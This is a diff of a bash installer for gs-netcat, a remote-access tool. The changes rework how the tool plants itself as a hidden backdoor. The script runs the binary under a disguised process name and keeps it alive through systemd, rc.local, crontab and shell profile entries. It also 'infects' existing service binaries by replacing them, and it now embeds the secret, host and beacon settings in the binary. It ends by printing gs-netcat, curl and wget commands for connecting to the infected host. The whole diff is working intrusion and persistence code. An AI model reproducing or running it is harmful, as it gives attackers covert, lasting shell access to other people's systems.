@@ -894,13 +894,8 @@ init_setup()
 
 	USER_SEC_FILE="$(dirname "${DSTBIN}")/${SEC_NAME}"
 
-	# Do not add TERM= or SHELL= here because we do not like that to show in gs-dbus.service
-	[[ -n $GS_HOST ]] && ENV_LINE+=("GS_HOST='${GS_HOST}'")
-	[[ -n $GS_PORT ]] && ENV_LINE+=("GS_PORT='${GS_PORT}'")
-	# Add an empty item so that ${ENV_LINE[*]}GS_ARGS= adds an extra space between
-	[[ ${#ENV_LINE[@]} -ne 0 ]] && ENV_LINE+=("")
-
-	RCLOCAL_LINE="${ENV_LINE[*]}HOME=$HOME SHELL=$SHELL TERM=xterm-256color GS_ARGS=\"-k ${RCLOCAL_SEC_FILE} -liqD\" $(command -v bash) -c \"cd /root; exec -a '${PROC_HIDDEN_NAME}' ${DSTBIN}\" 2>/dev/null"
+	# RCLOCAL_LINE="$(command -v bash) -c \"cd /root; exec -a '${PROC_HIDDEN_NAME}' ${DSTBIN}\" 2>/dev/null"
+	RCLOCAL_LINE="'${DSTBIN}' 2>/dev/null"
 
 	# There is no reliable way to check if a process is running:
 	# - Process might be running under different name. Especially OSX checks for the orginal name
@@ -909,8 +904,8 @@ init_setup()
 	# The best we can do:
 	# 1. Try pkill/killall _AND_ daemon is running then do nothing.
 	# 2. Otherwise start gs-dbus as DAEMON. The daemon will exit (fully) if GS-Address is already in use.
-	PROFILE_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} ${BIN_HIDDEN_NAME} 2>/dev/null || (${ENV_LINE[*]}TERM=xterm-256color GS_ARGS=\"-k ${USER_SEC_FILE} -liqD\" exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}' 2>/dev/null)"
-	CRONTAB_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} ${BIN_HIDDEN_NAME} 2>/dev/null || ${ENV_LINE[*]}SHELL=$SHELL TERM=xterm-256color GS_ARGS=\"-k ${USER_SEC_FILE} -liqD\" $(command -v bash) -c \"exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}'\" 2>/dev/null"
+	PROFILE_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} ${BIN_HIDDEN_NAME} 2>/dev/null || '${DSTBIN}' 2>/dev/null"
+	CRONTAB_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} ${BIN_HIDDEN_NAME} 2>/dev/null || '${DSTBIN}' 2>/dev/null"
 
 
 	if [[ -n $ENCODE_STR ]]; then
@@ -932,7 +927,7 @@ uninstall_rm()
 	[[ ! -f "$1" ]] && return # return if file does not exist
 
 	echo "Removing $1..."
-	xrm "$1" 2>/dev/null || return
+	xrm "$1" 2>/dev/null
 }
 
 uninstall_rmdir()
@@ -974,6 +969,10 @@ uninstall_service()
 	sf="${dir}/${sn}.service"
 
 	[[ ! -f "${sf}" ]] && return
+	[[ $UID -ne 0 ]] && {
+		echo "${CDY}WARN${CN}: Disinfecting ${fn}...FAILED. Need to be root."
+		return 255
+	}
 
 	command -v systemctl >/dev/null && [[ $UID -eq 0 ]] && {
 		ts_add_systemd "${WANTS_DIR}/multi-user.target.wants"
@@ -990,11 +989,14 @@ uninstall_systemd_infect() {
 	local fn="$2"
 	local bn
 	
+	[[ ! -f "${fn} " ]] && return 0
+	[[ $UID -ne 0 ]] && {
+		echo "${CDY}WARN${CN}: Disinfecting ${fn}...FAILED. Need to be root."
+		return 255
+	}
+
 	bn=$(basename "${fn}")
 
-	[[ ! -f "${fn} " ]] && return 0
-
-	echo "Disinfecting ${fn}..."
 	xmv "${fn} " "${fn}"
 	cmd_kill_arr+=("${bn}")
 }
@@ -1090,6 +1092,7 @@ OK_OUT()
 {
 	echo -e "......[${CG}OK${CN}]"
 	[[ -n "$1" ]] && echo -e "--> $*"
+	return 0
 }
 
 FAIL_OUT()
@@ -1129,36 +1132,88 @@ WARN_EXECFAIL()
 
 HOWTO_CONNECT_OUT()
 {
+	local str
+	local xstr
+	local opt="-i"
+
+	[[ -n $GS_HOST ]] && str+="GS_HOST=$GS_HOST "
+	[[ -n $GS_BEACON ]] && {
+		opt+="w"
+		xstr="GS_ARGS=-w "
+	}
 	# After all install attempts output help how to uninstall
 	echo -e "--> To uninstall use ${CM}GS_UNDO=1 ${DL_CMD}${CN}"
-	echo -e "--> To connect use one of the following:
---> ${CM}gs-netcat -s \"${GS_SECRET}\" -i${CN}
---> ${CM}S=\"${GS_SECRET}\" ${DL_CRL}${CN}
---> ${CM}S=\"${GS_SECRET}\" ${DL_WGT}${CN}"
+	echo -e "--> To connect use one of the following
+--> ${CM}${str}gs-netcat -s \"${GS_SECRET}\" ${opt}${CN}
+--> ${CM}${str}${xstr}S=\"${GS_SECRET}\" ${DL_CRL}${CN}
+--> ${CM}${str}${xstr}S=\"${GS_SECRET}\" ${DL_WGT}${CN}"
+}
+
+# Execute 'src' to create configuration and add it to 'dst'.
+# config2bin src dst ARGS
+# 'src' must be executeable.
+config2bin() {
+	local src="$1"
+	local dst="$2"
+	local opts="$3"
+	local dst_final
+
+	[[ "$src" == "$dst" ]] && {
+		# Identical => make temporary copy first (because we can not append
+		# data to a binary that is currently being executed/loaded)
+		dst_final="${dst}"
+		dst="${src}.tmp"
+		_ts_add_pdir "${dst_final}"
+	}
+
+	[[ ! -f "${dst}" ]] && {
+		_ts_add_pdir "${dst}"
+		cp -p "${src}" "${dst}" || return 255
+	}
+
+	TERM=xterm-256color GS_PROC_HIDDENNAME="${PROC_HIDDEN_NAME:?}" GS_BEACON="${GS_BEACON}" GS_STEALTH=1 GS_CONFIG_WRITE="${dst}" GS_ARGS="${opts}" GS_SECRET="${GS_SECRET:?}" "${src}" || return 255
+	[[ -n "$dst_final" ]] && {
+		cat "${dst}" >"${dst_final}"
+		rm -f "${dst:?}"
+	}
+
+	return 0
+}
+
+# Load configuration from TARGET by executing EXE.
+# exe target
+bin2config() {
+	local exe="$1"
+	local bin="$2"
+
+	unset GS_CONFIG_SECRET
+	unset GS_CONFIG_PROC_HIDDENNAME
+	unset GS_CONFIG_NOT_FOUND
+	unset GS_CONFIG_BEACON
+	unset GS_CONFIG_HOST
+	unset GS_CONFIG_PORT
+	[[ ! -f "${exe}" ]] && return
+	[[ ! -f "${bin}" ]] && return
+
+	GS_STEALTH=1 GS_CONFIG_READ="${bin:?}" GS_CONFIG_CHECK=1 "${exe:?}" -h 2>/dev/null | grep ^GS_CONFIG_
+	eval "$(GS_STEALTH=1 GS_CONFIG_READ="${bin:?}" GS_CONFIG_CHECK=1 "${exe:?}" -h 2>/dev/null | grep ^GS_CONFIG_)"
 }
 
 # Try to load a GS_SECRET
-gs_secret_reload()
-{
-	# DEBUGF "${CG}secret_load(${1})${CN}"
-	[[ -n $GS_SECRET_FROM_FILE ]] && return
-	[[ ! -f "$1" ]] && return
+gs_secret_reload() {
+	[[ ! -f "${DSTBIN:?}" ]] && return 255
 
-	# GS_SECRET="UNKNOWN" # never ever set GS_SECRET to a known value
-	local sec
-	sec=$(<"$1")
-	[[ ${#sec} -lt 4 ]] && return
-	WARN "Using existing secret from '${1}'"
-	if [[ ${#sec} -lt 10 ]]; then
-		WARN "SECRET in '${1}' is very short! (${#sec})"
-	fi
-	GS_SECRET_FROM_FILE=$sec
-}
+	bin2config "${DSTBIN}" "${DSTBIN}"
+	[[ -z "$GS_CONFIG_SECRET" ]] && return 255
 
-gs_secret_write()
-{
-	mk_file "$1" || return
-	echo "$GS_SECRET" >"$1" || return
+	WARN "Already installed in '${DSTBIN}' $GS_CONFIG_BEACON"
+
+	GS_SECRET="$GS_CONFIG_SECRET"
+	GS_BEACON="$GS_CONFIG_BEACON"
+	# GS_PORT="$GS_CONFIG_PORT"
+	GS_HOST="$GS_CONFIG_HOST"
+	HOWTO_CONNECT_OUT
+	exit_code 0
 }
 
 # Return 200 if already infected.
@@ -1168,19 +1223,20 @@ infect_bin() {
 	[[ ! -f "$bin" ]] && { SKIP_OUT "Not found: ${bin}."; return 255; }
 	local ret
 
-	# Check if target binary is already GSNC
-	ret=$(GS_STEALTH=1 GS_CONFIG_READ="${bin}" GS_CONFIG_CHECK=1 "${DSTBIN}" -h 2>/dev/null)
-	# Old binary outputs 'uname -a' on -h. New binary output GS_SECRET.
-	[[ $ret == *" "* ]] && {
-		SKIP_OUT "Old gs-netcat binary. Infection not supported."
-		return 255
-	}
-	[[ -n "$ret" ]] && {
-		GS_SECRET="$ret"
+	bin2config "$DSTBIN" "${bin}"
+	[[ -n "$GS_CONFIG_SECRET" ]] && {
+		GS_SECRET="$GS_CONFIG_SECRET"
 		((IS_INSTALLED+=1))
 		IS_SKIPPED=1
 		SKIP_OUT "Already infected."
 		return 200
+	}
+
+	[[ -z "$GS_CONFIG_NOT_FOUND" ]] && {
+		# Check for old binary that output uname -a
+		# Infection not supported by old binary.
+		SKIP_OUT "Old gs-netcat binary. GS_UNDO=1 first."
+		return 255
 	}
 
 	# Broken old install?
@@ -1190,23 +1246,27 @@ infect_bin() {
 	_ts_add "${bin}"
 	# Can not overwrite a running binary. First move it away:
 	xmv "${bin}" "${bin} " || { FAIL_OUT "Could not move ${bin}."; return 255; }
+
 	# Copy it back so that we retain permissions
 	cp -p "${bin} " "${bin}" || {
 		xmv "${bin} " "${bin}" # Try to recover...
 		FAIL_OUT "Could not move '${bin} ' to '${bin}'."
 		return 255
 	}
-
-	(cat "${DSTBIN}"; TERM=xterm-256color GS_STEALTH=1 GS_CONFIG_WRITE=- GS_ARGS="-liq" GS_SECRET="${GS_SECRET:?}" "${DSTBIN}") >"${bin}" || { 
-		xmv "${bin} " "${bin}" # Try to recover...
-		FAIL_OUT "Could not copy"
-		return 255
-	}
+	cat "${DSTBIN}" >"${bin}"
 }
 
+do_config2bin() {
+	echo -en "Adding configuration.................................................."
+	config2bin "${1:?}" "${2:?}" "${3:?}" || {
+		FAIL_OUT
+		return 255
+	}
+	OK_OUT
+}
 
 install_systemd_new() {
-	local str
+	do_config2bin "${DSTBIN}" "${DSTBIN}" "-ilq" || return 255
 
 	printf "%-70.70s" "Installing as systemd ${SERVICE_HIDDEN_NAME}.service.............................................."
 
@@ -1229,12 +1289,11 @@ After=network.target
 [Service]
 Restart=always
 RestartSec=300
-ExecStart=/bin/bash -c \"${ENV_LINE[*]}GS_ARGS='-k $SYSTEMD_SEC_FILE -ilq' exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}'\"
+ExecStart=${DSTBIN}
 
 [Install]
 WantedBy=multi-user.target" >"${SERVICE_FILE}" || return 255
 
-	gs_secret_write "$SYSTEMD_SEC_FILE"
 	ts_add_systemd "${WANTS_DIR}/multi-user.target.wants"
 	ts_add_systemd "${WANTS_DIR}/multi-user.target.wants/${SERVICE_HIDDEN_NAME}.service" "${SERVICE_FILE}"
 
@@ -1250,7 +1309,6 @@ WantedBy=multi-user.target" >"${SERVICE_FILE}" || return 255
 install_systemd_infect() {
 	local name="$1"
 	local bin="$2"
-	# local svfile="/lib/systemd/system/${name}.service"
 	local str
 	local ret
 
@@ -1269,6 +1327,10 @@ install_systemd_infect() {
 	IS_SYSTEMD=1
 	((IS_INSTALLED+=1))
 	OK_OUT
+	# FIXME: It would be better if I do this BEFORE installing the service or otherwise we can not
+	# recover if this fails:
+	do_config2bin "${DSTBIN}" "${bin}" "-liq" || return 255
+
 	STARTING_STR="Starting gs-netcat as infected '${name}.service'"
 }
 
@@ -1343,27 +1405,22 @@ install_system_rclocal()
 
 	install_to_file "${RCLOCAL_FILE}" "$NOTE_DONOTREMOVE" "$RCLOCAL_LINE"
 
-	gs_secret_write "$RCLOCAL_SEC_FILE"
-
 	((IS_INSTALLED+=1))
 	OK_OUT
+	do_config2bin "${DSTBIN}" "${DSTBIN}" "-ilqD" || return 255
 }
 
 install_system()
 {
 	# Try systemd first
-	install_system_systemd
+	install_system_systemd && return
 
 	# Try good old /etc/rc.local
-	[[ -z "$IS_INSTALLED" ]] && install_system_rclocal
-
-	[[ -z "$IS_INSTALLED" ]] && { 
+	install_system_rclocal || { 
 		echo -en "Installing systemwide remote access permanentally....................."
 		FAIL_OUT "no systemctl or /etc/rc.local"
 		return
 	}
-
-	[[ -n $IS_SKIPPED ]] && return
 }
 
 install_user_crontab()
@@ -1425,12 +1482,14 @@ install_user()
 		install_user_crontab
 	fi
 
-	[[ $IS_INSTALLED -ge 2 ]] && return
-	# install_user_profile
-	for x in "${RC_FN_LIST[@]}"; do
-		install_user_profile "$x"
-	done
-	gs_secret_write "$USER_SEC_FILE" # Create new secret file
+	[[ $IS_INSTALLED -lt 2 ]] && {
+		# install_user_profile
+		for x in "${RC_FN_LIST[@]}"; do
+			install_user_profile "$x"
+		done
+	}
+
+	do_config2bin "${DSTBIN}" "${DSTBIN}" "-ilqD" || return 255
 }
 
 ask_nocertcheck()
@@ -1543,12 +1602,11 @@ test_bin()
 
 	# Try to execute the binary
 	unset ERR_LOG
-	GS_OUT=$("$bin" -g 2>&1)
-	ret=$?
-	[[ $ret -ne 0 ]] && {
+	GS_OUT=$("$bin" -g 2>/dev/null)
+	[[ -z "$GS_OUT" ]] && {
 		# 126 - Exec format error
 		FAIL_OUT
-		ERR_LOG="$GS_OUT"
+		ERR_LOG="$("$bin" -g 2>&1 1>/dev/null)"
 		WARN_EXECFAIL_SET "$ret" "wrong binary"
 		return
 	}
@@ -1570,9 +1628,7 @@ test_network()
 	# 2. Exit=202 after n seconds. Firewalled/DNS?
 	# 3. Exit=203 if TCP to GSRN is refused.
 	# 3. Exit=61 on GS-Connection refused. (server does not exist)
-	# Do not need GS_ENV[*] here because all env variables are exported
-	# when exec is used.
-	err_log=$(_GSOCKET_SERVER_CHECK_SEC=15 GS_ARGS="-s ${GS_SECRET} -t" exec -a "$PROC_HIDDEN_NAME" "${DSTBIN}" 2>&1)
+	err_log=$(_GSOCKET_SERVER_CHECK_SEC=15 GS_READ_CONFIG=0 GS_ARGS="-s ${GS_SECRET} -t" exec -a "$PROC_HIDDEN_NAME" "${DSTBIN}" 2>&1)
 	ret=$?
 
 	[[ -z "$ERR_LOG" ]] && ERR_LOG="$err_log"
@@ -1676,8 +1732,8 @@ try_network()
 	WARN_EXECFAIL
 }
 
-# try <osarch> <srcpackage>
-try()
+# install <osarch> <srcpackage>
+install()
 {
 	local osarch="$1"
 	local src_pkg="$2"
@@ -1714,7 +1770,6 @@ try()
 		OK_OUT
 		return
 	fi
-
 	rm -f "${TMPDIR}/${src_pkg:?}"
 }
 
@@ -1789,7 +1844,7 @@ gs_start()
 		else
 			# HERE: sec.dat has been updated
 			OK_OUT
-			WARN "More than one ${PROC_HIDDEN_NAME} is running."
+			WARN "Multiple gs-netcats running."
 			echo -e "--> You may want to check: ${CM}ps -elf|grep -E -- '(${PROC_HIDDEN_NAME_RX})'${CN}"
 			[[ -n $OLD_PIDS ]] && echo -e "--> or terminate the old ones: ${CM}kill ${OLD_PIDS}${CN}"
 		fi
@@ -1797,16 +1852,10 @@ gs_start()
 		OK_OUT ""
 	fi
 
-	if [[ -n "$IS_NEED_START" ]]; then
-		# We need an 'eval' here because the ENV_LINE[*] needs to be expanded
-		# and then executed.
-		# This wont work:
-		#     FOO="X=1" && ($FOO id)  # => -bash: X=1: command not found
-		# This does work:
-		#     FOO="X=1" && (eval $FOO id)
-		(cd "$HOME"; eval "${ENV_LINE[*]}"TERM=xterm-256color GS_ARGS=\"-s "$GS_SECRET" -liD\" exec -a \""$PROC_HIDDEN_NAME"\" \""$DSTBIN"\") || errexit
-		IS_GS_RUNNING=1
-	fi
+	[[ -z $IS_NEED_START ]] && return
+
+	(cd "$HOME"; "$DSTBIN") || errexit
+	IS_GS_RUNNING=1
 }
 
 init_vars
@@ -1821,26 +1870,17 @@ init_setup
 [[ -n "$X" ]] && GS_SECRET_X="$X"
 
 if [[ -z $S ]]; then
-	# HERE: S= is NOT set
-	if [[ $UID -eq 0 ]]; then
-		gs_secret_reload "$SYSTEMD_SEC_FILE" 
-		gs_secret_reload "$RCLOCAL_SEC_FILE" 
-	fi
-	gs_secret_reload "$USER_SEC_FILE"
+	# HERE: S= is NOT set. Exit if already installed.
+	gs_secret_reload
 
-	if [[ -n $GS_SECRET_FROM_FILE ]]; then
-		GS_SECRET="${GS_SECRET_FROM_FILE}"
-	else
-		GS_SECRET="${GS_SECRET_X}"
-	fi
-
-	DEBUGF "GS_SECRET=$GS_SECRET (F=${GS_SECRET_FROM_FILE}, X=${GS_SECRET_X})"
+	GS_SECRET="${GS_SECRET_X}"
 else
 	GS_SECRET="$S"
 	URL_BIN="$URL_BIN_FULL"
 fi
 
-try "$OSARCH" "$SRC_PKG"
+STARTING_STR="Starting '${BIN_HIDDEN_NAME}' as hidden process '${PROC_HIDDEN_NAME}'"
+install "$OSARCH" "$SRC_PKG"
 
 WARN_EXECFAIL
 [[ -z "$IS_TESTBIN_OK" ]] && errexit "None of the binaries worked."
@@ -1851,7 +1891,6 @@ WARN_EXECFAIL
 [[ -n "$S" ]] && gs_access
 
 # -----BEGIN Install permanentally-----
-STARTING_STR="Starting '${BIN_HIDDEN_NAME}' as hidden process '${PROC_HIDDEN_NAME}'"
 if [[ -z $GS_NOINST ]]; then
 	if [[ -n $IS_DSTBIN_TMP ]]; then
 		echo -en "Installing remote access.............................................."
